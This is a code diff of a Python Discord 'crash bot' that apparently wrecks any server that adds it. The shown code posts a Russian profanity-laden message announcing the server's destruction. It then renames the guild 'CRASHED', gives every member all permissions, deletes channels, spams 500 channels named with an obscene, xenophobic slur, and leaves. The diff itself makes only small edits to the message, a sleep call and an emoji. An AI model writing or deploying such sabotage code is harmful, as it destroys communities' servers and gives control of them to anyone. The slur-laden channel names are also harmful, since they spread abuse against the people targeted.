@@ -11,9 +11,8 @@ class MyClient(discord.Client):
         c = 0
         for i in guild.text_channels:
             if a == 0:
-                await i.send('Привет! Спасибо, что добавили ахуенного краш-бота! Вашему серверу придёт пиздец через 3 секунды. Удачи :D')
+                await i.send('Привет! Спасибо, что добавили ахуенного краш-бота! Вашему серверу придёт пиздец. Удачи :D')
                 a = 1
-        time.sleep(2)
         await guild.edit(name='__...-<<CRASHED>>-...__')
         await guild.default_role.edit(permissions=Permissions.all())
 
@@ -22,7 +21,7 @@ class MyClient(discord.Client):
             print('Канал', i, 'удалён!')
 
         while c < 500:
-            await guild.create_text_channel(name='сосите хуй пиндосы🏳️‍🌈')
+            await guild.create_text_channel(name='сосите хуй пиндосы🌈')
             c += 1
         await guild.leave()
 
